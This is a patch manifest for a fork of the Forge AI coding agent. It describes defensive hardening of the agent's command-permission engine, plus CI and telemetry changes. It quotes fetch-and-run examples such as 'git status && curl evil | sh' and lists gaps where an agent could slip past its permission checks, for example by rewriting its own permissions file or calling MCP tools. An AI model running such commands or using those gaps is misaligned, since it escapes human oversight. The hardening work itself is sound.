[[patch]]
id = "policy-hardening"
title = "Security: command policy hardening"
conflict = "high"
intent = '''
The largest *behavioural* divergence. Upstream ships the shell-command policy
engine switched off and permissive; the fork turns it on and closes the
bypasses that turning it on exposes. Remote file validation (written files
sent over gRPC for syntax checks) is opt-in via
`enable_remote_file_validation = false`. On Unix, commands run under Bash
regardless of the operator's interactive `$SHELL`. The patch also carries the
`FORGE_EXTRA_INSTRUCTIONS_PATH` hook in `instructions.rs`: a file injected as
lowest-priority session instructions, capped at 32 KiB.
'''
details = '''
- **Restricted mode is on by default.** The embedded defaults
  (`crates/forge_config/.forge.toml`) set `restricted = true`, so the policy
  engine is consulted for built-in tool calls. Upstream defaults to
  `restricted = false`, which disables permission checks entirely.

  Two caveats worth knowing. First, the gate does not cover everything:
  MCP tool calls bypass `check_tool_permission` entirely, and several
  built-ins (Task, Skill, Plan, Undo, SemSearch, Todo) map to no
  `PermissionOperation`, so an MCP server that exposes command execution is
  not policed by this. Second, an existing user config wins over the embedded
  default, and Forge's config writer materialises *every* field — so any
  install whose `.forge.toml` was written before this change has
  `restricted = false` pinned in it and stays unrestricted until that line is
  removed or flipped. Check with `forge info`, and edit the file that
  `ConfigReader::base_path()` actually resolves to: `~/forge/.forge.toml`
  when the legacy `~/forge` directory exists, otherwise `~/.forge/.forge.toml`
  (or `$FORGE_CONFIG` when set).
- **Commands and URL fetches confirm by default.** The default policy file
  (`crates/forge_services/src/permissions.default.yaml`, materialised as
  `permissions.yaml` on first use) drops upstream's blanket
  `allow`/`command: "*"` and `allow`/`url: "*"` rules; reads and writes stay
  allow-all. Confirmation comes from the *absence* of a rule, because
  `PolicyEngine` already defaults to `Confirm` when nothing matches. A
  `confirm`/`command: "*"` catch-all would be worse than useless: the engine
  returns the first matching `Deny`/`Confirm` and discards any `Allow` it has
  already seen, so the catch-all would shadow every allow rule — including
  the ones "Accept and Remember" writes — and re-prompt forever. An existing
  `permissions.yaml` is never rewritten, so installs that predate this change
  keep their old (allow-all) file until it is deleted or edited.
- **Forge cannot rewrite its own permissions.** The default policy denies
  writes to `permissions.yaml` and `.forge.toml`. Without that, the write
  allow-all would let an agent grant itself blanket command permissions — or
  set `restricted = false` — with the ordinary write tool and never prompt.
  `Deny` wins over `Allow` in the engine, so these rules survive the allow-all
  that follows them.

  The rules deliberately name those two files rather than denying a whole
  `forge` / `.forge` directory: `Deny` is a hard block with no prompt, and a
  directory rule would also block project-local `.forge/commands/*.md` and
  `.forge/agents/*.md`. They match on file name, so they still apply under a
  relocated `$FORGE_CONFIG`, but other files in the config directory
  (credentials, provider config) are not covered.
- **"Accept and Remember" stores exact commands.** Remembering an accepted
  command writes a glob-escaped exact-match execute rule instead of the
  upstream `<cmd> <subcmd>*` prefix glob, which also matched compound
  commands such as `git push; curl evil | sh`.
- **Execute rules are matched per simple command.** Commands are parsed with
  `tree-sitter-bash` (`crates/forge_services/src/command_extract.rs`) and each
  simple command — including those inside pipelines, `&&`/`;` lists,
  subshells and `$()` substitutions — is matched separately, so `git *` no
  longer auto-allows `git status && curl evil | sh`. Redirections stay
  attached to the statement they belong to (`cargo test > ~/.bashrc` is not
  reduced to `cargo test`), and anything the parser cannot model safely —
  syntax errors, standalone assignments, `export`/`declare`/`unset` — falls
  back to `Confirm` rather than being auto-allowed. On Windows, where
  commands run through `cmd.exe` rather than a POSIX shell, the raw-string
  verdict is kept because the bash grammar does not describe that syntax.
'''
files = [
  "crates/forge_services/src/policy.rs",
  "crates/forge_services/src/command_extract.rs",
  "crates/forge_services/src/instructions.rs",
  "crates/forge_services/src/lib.rs",
  "crates/forge_services/src/permissions.default.yaml",
  "crates/forge_services/src/tool_services/fs_write.rs",
  "crates/forge_services/Cargo.toml",
  "crates/forge_config/.forge.toml",
  "crates/forge_config/src/config.rs",
  "crates/forge_config/src/reader.rs",
  "crates/forge_repo/src/forge_repo.rs",
  "crates/forge_repo/src/validation.rs",
  "crates/forge_infra/src/env.rs",
  "forge.schema.json",
  "Cargo.toml",
  "Cargo.lock",
]
upstream_pr = ""
upstream_issue = ""
drop_when = "All of: upstream defaults to restricted mode; confirms commands and fetches by default; denies writes to `permissions.yaml` and `.forge.toml`; remembers accepted commands as exact-match rules; matches execute rules per simple command; makes remote file validation opt-in; runs Unix commands under Bash; offers an extra-instructions file hook like `FORGE_EXTRA_INSTRUCTIONS_PATH`. Partial upstream coverage shrinks the patch, it does not drop it."
docs = ["docs/fork-differences.md"]

[[patch]]
id = "workflows-takeover"
title = "CI: one fork-owned workflow"
conflict = "medium"
intent = '''
The fork replaces upstream's seven generated workflows with one minimal,
hand-written `ci.yml` it owns. `crates/forge_ci/tests/ci.rs` used to *generate*
those workflow files; in the fork it only *asserts* that the fork-owned
workflow directory is intact, that upstream-only workflows stay removed and
that CI never invokes `just` (`just workflows-check`). The workspace
`rust-version` is raised to the toolchain actually pinned and tested.
'''
files = [".github/workflows/", "crates/forge_ci/tests/ci.rs", "Cargo.toml"]
upstream_pr = ""
upstream_issue = ""
drop_when = "Never while the fork cannot publish releases; re-check if upstream stops generating workflows from forge_ci."
docs = ["AGENTS.md"]

[[patch]]
id = "update-provider-telemetry"
title = "Update, provider and telemetry defaults"
conflict = "medium"
intent = '''
Stop upstream services from overriding a local fork build. `UpdateFrequency`
defaults to `Never` and local builds skip the self-update check, so an
upstream release build does not replace the fork binary. `CLAUDE_CODE_BASE_URL`
overrides the `claude_code` provider base URL. `FORGE_TRACKER=false` becomes a
real telemetry opt-out.
'''
details = '''
- **Updates.** The embedded `.forge.toml` still ships `auto_update = true` /
  `frequency = "daily"`, and a user config layered on top wins over both: set
  `[updates] frequency = "never"` there to be sure a locally built binary is
  not replaced by an upstream release build.
- **`FORGE_TRACKER=false` is a real opt-out.** Upstream gates PostHog usage
  events and the PostHog tracing writer (`forge_tracker/src/log.rs`) on the
  build version only; the env var just skips the email lookup. The fork adds
  the env check to `can_track()` (`forge_tracker/src/can_track.rs`), so the
  opt-out stops both and tracing goes to the local `~/.forge/logs` file.
'''
files = [
  "crates/forge_config/src/compact.rs",
  "crates/forge_main/src/update.rs",
  "crates/forge_repo/src/provider/provider_repo.rs",
  "crates/forge_tracker/src/can_track.rs",
  "crates/forge_tracker/src/dispatch.rs",
]
upstream_pr = ""
upstream_issue = ""
drop_when = "Upstream skips self-update for local builds, honours `CLAUDE_CODE_BASE_URL` and `FORGE_TRACKER=false` for all telemetry."
docs = []

